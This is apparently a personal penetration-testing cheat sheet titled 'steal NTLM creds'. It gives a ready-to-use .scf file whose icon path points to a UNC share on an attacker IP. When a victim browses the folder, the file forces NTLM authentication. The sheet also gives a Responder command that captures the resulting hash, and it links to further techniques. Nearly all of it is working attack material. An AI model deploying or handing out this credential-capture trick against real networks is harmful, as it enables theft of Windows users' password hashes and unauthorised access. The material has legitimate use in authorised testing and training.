# steal NTLM creds

## .scf file

```
[Shell]
Command=2
IconFile=\\IP\drive\kashz.ico
[Taskbar]
Command=ToggleDesktop

# use responder to capture hash
sudo responder -wrf --lm -v -I tun0
```

## More Ways

* [Hacktricks.xyz/places-to-steal-ntlm-creds](https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds)
